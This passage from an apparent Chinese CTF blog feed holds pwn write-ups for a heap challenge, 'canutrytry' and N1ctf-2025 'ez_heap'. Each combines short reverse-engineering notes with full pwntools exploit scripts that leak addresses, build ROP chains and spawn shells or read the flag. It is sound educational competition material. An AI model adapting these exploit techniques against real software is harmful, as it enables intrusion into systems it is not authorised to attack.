class="line"><span class="keyword">def</span> <span class="title function_">manager_write</span>(<span class="params">content</span>):</span><br><span class="line">manager(<span class="string">&quot;MANAGER_write&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager_user_read</span>():</span><br><span class="line">manager(<span class="string">&quot;MANAGER_visit&quot;</span>,<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;to user_logs\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager_user_write</span>(<span class="params">content</span>):</span><br><span class="line">manager(<span class="string">&quot;MANAGER_visit&quot;</span>,<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;to user_logs\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *$rebase(0x179F)&quot;)</span></span><br><span class="line"><span class="comment"># leak pie &amp; heap</span></span><br><span class="line">user(<span class="string">&quot;MANAGER_visit&quot;</span>,<span class="number">0</span>)</span><br><span class="line">manager_user_read()</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">heap_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment">#-0x1f30</span></span><br><span class="line">io.recv(<span class="number">2</span>)</span><br><span class="line">pie=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x41a0</span></span><br><span class="line">logv(<span class="string">&quot;heap_addr&quot;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">logv(<span class="string">&quot;pie&quot;</span>,<span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line"><span class="comment"># heap1-&gt; next = manage_physic[2]</span></span><br><span class="line">manager_user_write(p64(<span class="number">1</span>)+p64(heap_addr)+p64(heap_addr-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">manager_write(p64(pie+elf.got[<span class="string">&quot;puts&quot;</span>]))</span><br><span class="line">manager_user_read()</span><br><span class="line">puts=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base=puts-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">logv(<span class="string">&quot;libc_base&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">pop_rdi=libc_base+pop_rdi</span><br><span class="line">ret=libc_base+ret</span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">manager_write(p64(libc_base+libc.sym[<span class="string">&quot;environ&quot;</span>]))</span><br><span class="line">manager_user_read()</span><br><span class="line">stack=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x150</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># heap1-&gt;next=stack</span></span><br><span class="line">manager_write(p64(stack))</span><br><span class="line">payload=p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)</span><br><span class="line">manager_user_write(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#user(&quot;USER_write&quot;,0)</span></span><br><span class="line"><span class="comment">#io.sendlineafter(&quot;user_logs\n&quot;,str(1))</span></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="canutrytry"><a href="#canutrytry" class="headerlink" title="canutrytry"></a>canutrytry</h2><h3 id="查看沙箱-1"><a href="#查看沙箱-1" class="headerlink" title="查看沙箱"></a>查看沙箱</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805082927143.png" alt="image-20250805082927143"></p><p>只允许read，write，close，futex的syscall。看来是要ORW了。</p><h3 id="ida-分析-1"><a href="#ida-分析-1" class="headerlink" title="ida 分析"></a>ida 分析</h3><p>打开一看发现这是一道c++的题目。先从main函数开始分析函数的主要逻辑。</p><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805210913492.png" alt="main函数"></p><p>先看汇编，发现有很多try，catch，这是c++的异常处理。反汇编后这些部分没有显示出来，我们先不看，先分析主要功能。</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805213430837.png" alt="main函数"></p><p>两个主要功能，visit()和left()</p><h5 id="visit"><a href="#visit" class="headerlink" title="visit"></a>visit</h5><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805213930699.png" alt="visit函数"><br><img src="C:/Users/22354/AppData/Roaming/Typora/typora-user-images/image-20250805214633791.png" alt="visit函数"></p><p>visit中有三个选项，2只能按顺序设置堆块大小且只有2次，1 只能按顺序malloc两次堆块，3 可以任意写堆块的内容。且idx无检测。</p><p>1 选项中有对异常的处理。</p><h5 id="left"><a href="#left" class="headerlink" title="left"></a>left</h5><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805221246184.png" alt="left函数"></p><p>只有一次机会，可以把堆块的内容复制到栈上，大小无限制。且有对异常的处理。</p><p>毫无疑问，此题中异常处理是至关重要的。所以我们接下来要分析所以try ，catch的对应关系。</p><h3 id="异常处理对应"><a href="#异常处理对应" class="headerlink" title="异常处理对应"></a>异常处理对应</h3><h5 id="分析方法"><a href="#分析方法" class="headerlink" title="分析方法"></a>分析方法</h5><p>ida在汇编代码中，会对catch标记，在其后面标注owner by xxx</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805222122309.png" alt="catch"> </p><p>根据这样的对应关系，我们可以把main函数重新反汇编一下，把完整的函数逆向出来。</p><p>当然ida 有视图可以更好的看出函数的跳转对应关系</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805222435058.png" alt="跳转"></p><h5 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    seccomp_add();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                menu();</span><br><span class="line">            &#125;</span><br><span class="line">            catch&#123;</span><br><span class="line">                sub_4016ec();</span><br><span class="line">                sub_401652();</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">            try&#123;</span><br><span class="line">                <span class="built_in">stdin</span>&gt;&gt;choice;</span><br><span class="line">                <span class="keyword">if</span>(choice!=<span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">                visit_nep();</span><br><span class="line">                <span class="keyword">if</span>(choice!=<span class="number">2</span>) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                left_nep();</span><br><span class="line">            &#125;</span><br><span class="line">            catch&#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;you catch the error &quot;</span> &lt;&lt; err2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;here is a gift for you!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;setbufaddr:%p\n&quot;</span>, setbuf_ptr);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;stackaddr:%p\n&quot;</span>, &amp;choice);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h4><ol><li>首先要通过visit或left中的异常处理，泄露出stack和 libc的信息。要注意的是，为了后续利用，这一步显然是通过visit 的异常，也就是size值非法。再注意，因为只能按顺序来，所以第一个堆块不能非法。所以要先申请第一个堆块后，利用第二个堆块的大小非法，触发异常拿到stack 和 libc </li><li>紧接着，要利用left中的异常，也就是复制的内容长度超过16.这里需要让异常处理跳转到menu（）的异常处理。只要把left的返回地址，修改为menu 函数执行完成时的返回地址就行。</li><li>第二步完成后，程序跳转到0x4610ec。这里会往bss 段上read ，显然是用来输入ROP的。</li><li>第三步过后，通过0x401652函数，程序最后跳转到0x4015d4。又有一次read，可以覆盖到rbp，同样会触发异常。但是最后还是会leave_ret,可以栈迁移。只要把rbp覆盖为之前输入ROP的地址-8 ，就行。</li></ol><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io,elf=loadfile(<span class="string">&quot;./canutrytry&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="number">0</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>():</span><br><span class="line">io.sendlineafter(<span class="string">&quot;your choice &gt;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>():</span><br><span class="line">io.sendlineafter(<span class="string">&quot;your choice &gt;&gt;&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_op</span>(<span class="params">op,size,idx</span>): <span class="comment"># size(content),1</span></span><br><span class="line">visit()</span><br><span class="line">io.sendlineafter(<span class="string">&quot;your choice &gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"><span class="keyword">if</span> op == <span class="number">2</span> :</span><br><span class="line">io.sendlineafter(<span class="string">&quot;size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">elif</span> op == <span class="number">3</span> :</span><br><span class="line">io.sendlineafter(<span class="string">&quot;index&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">io.sendafter(<span class="string">&quot;content&quot;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave_op</span>(<span class="params">idx</span>):</span><br><span class="line">leave()</span><br><span class="line">io.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *0x401600&quot;</span>)</span><br><span class="line"><span class="comment">#1 leak libc &amp; stack</span></span><br><span class="line">visit_op(<span class="number">2</span>,<span class="number">0x40</span>,<span class="number">0</span>)</span><br><span class="line">visit_op(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">visit_op(<span class="number">2</span>,-<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">visit_op(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;setbufaddr:&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x88060</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;stackaddr:&quot;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">logv(<span class="string">&quot;libc&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">logv(<span class="string">&quot;stack&quot;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">write=libc_base+libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"><span class="comment">## gadgets</span></span><br><span class="line">pop_rdi=libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi=libc_base + <span class="number">0x2be51</span></span><br><span class="line">pop_rdx=libc_base + <span class="number">0x11f497</span>  <span class="comment"># pop rdx;pop r12;ret</span></span><br><span class="line">leave_ret=<span class="number">0x401650</span></span><br><span class="line"><span class="comment">## addr </span></span><br><span class="line">ROP=<span class="number">0x4016EC</span></span><br><span class="line">flag=<span class="number">0x4053C0</span></span><br><span class="line">buf=<span class="number">0x405460</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2 prepare my ROP </span></span><br><span class="line">payload=<span class="number">0x20</span>*<span class="string">b&quot;a&quot;</span>+p64(buf)+p64(<span class="number">0x401ed9</span>)</span><br><span class="line">visit_op(<span class="number">3</span>,payload,<span class="number">0</span>)</span><br><span class="line">leave_op(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#3 orw  flag</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">2</span>)</span><br><span class="line">payload+= p64(pop_rsi)+p64(flag)</span><br><span class="line">payload+= p64(pop_rdx)+p64(<span class="number">0x64</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+= p64(write)</span><br><span class="line">io.sendafter(<span class="string">&quot;well,prepare your rop now!&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload+= p64(buf) </span><br><span class="line">io.sendafter(<span class="string">&quot;Enter your flag: &quot;</span>,<span class="string">b&quot;hhhh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">io.send(payload) </span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 中等难度 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N1ctf-2025-pwn</title>
      <link href="/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/N1ctf-2025-pwn/"/>
      <url>/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/N1ctf-2025-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="N1ctf-2025-pwn"><a href="#N1ctf-2025-pwn" class="headerlink" title="N1ctf-2025-pwn"></a>N1ctf-2025-pwn</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="ez-heap"><a href="#ez-heap" class="headerlink" title="ez_heap"></a>ez_heap</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>struct：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_struct</span>&#123;</span></span><br><span class="line">__int64 name_size;</span><br><span class="line">__int64 conten_size;</span><br><span class="line"><span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">__int64 heap_addr;</span><br><span class="line">__int64 arry_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实是用一个大堆块，每0x30 用来保存一个堆块的相关信息。 每次add，会申请新堆块来保存content</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250914201234102.png"></p><p>在这里发现，可以通过<code>*a3</code> 造成一个uaf 漏洞,配合后面<code>show()</code>可以泄露出main_arena,那么就拿到了libc.</p><p>但是进一步发现，edit和show 都只能使用一次，而且 <code>*a3</code> 为0 时,delete 会返回到v7(由用户控制),但是我们没有任何地址信息.</p><p>edit的scanf 虽然有溢出漏洞,但是<code>\x00</code> 截断的问题还是没有解决.如果可以知道pie ,我们可以覆盖heapaddr 为got 表把libc泄露出来.</p><p>等一下,原本这里是堆的地址,我们现在可以计算目标和这里原地址的偏移,同时已知^运算的另一个数,那么我们其实可以计算最后的结果,嘶~~ .那么就可以把pie泄露出来,接下来就是看能不能正常从edit和show里返回了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;66%&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一些阻碍</span></span><br><span class="line">pas=<span class="string">b&quot;admin&quot;</span>+<span class="string">b&quot;:&quot;</span>+<span class="string">b&quot;x&quot;</span>+p8(<span class="number">0xc2</span>)+<span class="string">b&quot;xxxxxx&quot;</span>+<span class="string">b&quot;:Junior:1234&quot;</span></span><br><span class="line">keys=<span class="string">b&quot;a&quot;</span>*<span class="number">7</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># b *$rebase(0x1C20)</span></span><br><span class="line"><span class="comment"># b *$rebase(0x1ae4)</span></span><br><span class="line"><span class="comment"># b *$rebase(0x1C0B)</span></span><br><span class="line"><span class="comment"># b *$rebase(0x1952)</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># onegadgets</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xef52b onegadgets</span></span><br><span class="line"><span class="string">0xef4ce onegadgets</span></span><br><span class="line"><span class="string">0x3F60 puts</span></span><br><span class="line"><span class="string">0x4080 </span></span><br><span class="line"><span class="string">b *$rebase(0x1D4C)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please enter your key:\n&quot;</span>,keys)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please enter your choice.~~&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    key()</span><br><span class="line">    io.sendafter(<span class="string">&quot;name:(size&lt;16)\n&quot;</span>,name)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;content size:(size&lt;=0x70)\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,num</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please enter your choice.~~\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    key()</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;numbers:\n&quot;</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please enter your choice.~~\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    key()</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,name</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please enter your choice.~~\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    key()</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;name:(size&lt;16)\n&quot;</span>,name)</span><br><span class="line">one=[<span class="number">0xef52b</span>,<span class="number">0xef4ce</span>]</span><br><span class="line">name=<span class="string">b&quot;a&quot;</span>*<span class="number">0xf</span></span><br><span class="line">main=<span class="number">0x1CCB</span></span><br><span class="line">menu=<span class="number">0x1DA1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Do you want to play a game with me?\n&quot;</span>,pas)</span><br><span class="line">    add(name,<span class="number">0x68</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">    add(name,<span class="number">0x68</span>,<span class="string">b&#x27;b\n&#x27;</span>)</span><br><span class="line">    add(name,<span class="number">0x68</span>,<span class="string">b&#x27;c\n&#x27;</span>)</span><br><span class="line">    add(name,<span class="number">0x68</span>,<span class="string">b&#x27;d\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># leak pie heap</span></span><br><span class="line">    payload=name+<span class="string">b&quot;\x00&quot;</span>+<span class="string">b&quot;\xba&quot;</span></span><br><span class="line">    edit(<span class="number">0</span>,payload)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    heap=u64(io.recv(<span class="number">6</span>).rjust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    pie=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x4080</span></span><br><span class="line">    logv(<span class="string">&quot;pie&quot;</span>,<span class="built_in">hex</span>(pie))</span><br><span class="line">    logv(<span class="string">&quot;heap&quot;</span>,<span class="built_in">hex</span>(heap))</span><br><span class="line">    delete(<span class="number">1</span>,<span class="built_in">str</span>(pie+main).encode())</span><br><span class="line">    <span class="comment"># count &amp; leak libc</span></span><br><span class="line"></span><br><span class="line">    puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]+pie</span><br><span class="line">    puts_encode=puts_got ^ <span class="number">0x787878787878c278</span></span><br><span class="line">    payload=name+<span class="string">b&quot;\x00&quot;</span>+p64(puts_encode)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Do you want to play a game with me?\n&quot;</span>,pas)</span><br><span class="line">    edit(<span class="number">2</span>,payload)</span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    puts=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    libc_base=puts-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    logv(<span class="string">&quot;puts&quot;</span>,<span class="built_in">hex</span>(puts))</span><br><span class="line">    logv(<span class="string">&quot;libc_base&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    getshell=libc_base+one[<span class="number">0</span>]</span><br><span class="line">    delete(<span class="number">1</span>,<span class="built_in">str</span>(getshell).encode())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io,elf=loadfile(<span class="string">&quot;./heap&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="number">0</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ez-jail"><a href="#ez-jail" class="headerlink" title="ez_jail"></a>ez_jail</h2><h2 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250920223356355.png" alt="image.png"></p><p>uaf可以配合<code>show</code>,泄露main_arena 信息来泄露libc ,但是要如何利用呢?</p>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>moectf-2025-pwn-fmt</title>
      <link href="/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/moectf-2025-pwn-fmt/"/>
